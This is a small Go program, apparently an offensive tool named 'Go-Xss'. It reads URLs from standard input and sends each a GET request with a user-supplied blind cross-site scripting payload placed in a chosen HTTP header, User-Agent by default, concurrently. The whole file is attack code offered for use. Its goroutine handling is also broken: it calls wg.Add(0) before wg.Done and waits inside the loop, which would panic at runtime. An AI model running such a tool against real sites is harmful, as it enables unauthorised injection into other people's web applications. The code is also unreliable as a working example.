// Created By Vuln



package main


import (
	"fmt"
	"flag"
	"sync"
	"time"
	"bufio"
	"os"
	"net/http"

)


func main(){
	fmt.Println(`
		
  ____           __  __        
 / ___| ___      \ \/ /___ ___ 
| |  _ / _ \ _____\  // __/ __|
| |_| | (_) |_____/  \\__ \__ \
 \____|\___/     /_/\_\___/___/

		`)


	var c int
	var h string
	var p string

	flag.IntVar(&c, "c", 30, "set the concurrend")
	flag.StringVar(&h, "h", "User-Agent", "The header to injecto our payload")
	flag.StringVar(&p, "p", "", "The blind xss payload")

	flag.Parse()
	if h == "" || p == "" {
			fmt.Println("Some arguments are not set")
			return
	}else {
		var wg sync.WaitGroup
		for i := 0; i < c; i++ {
				  wg.Add(i)
				  go func(){
				  		  testBxss(p, h)
				  		  wg.Done()

				  }()
				  wg.Wait()
		}		  
	}
}


func testBxss(payload string, header string) {
	time.Sleep(500 * time.Millisecond)
	scanner := bufio.NewScanner(os.Stdin)
	client := &http.Client {}



	for scanner.Scan() {
		link := scanner.Text()
		fmt.Println("[+] Testing: " + link + "For xss-Golang")
		fmt.Println("[*] Header: \t" + header)
		fmt.Println("[-] Payload: \t" + payload)
		req, err := http.NewRequest("GET", link, nil)
		if err != nil{
			return
		}
		req.Header.Set(header, payload)

		client.Do(req)
	}	
}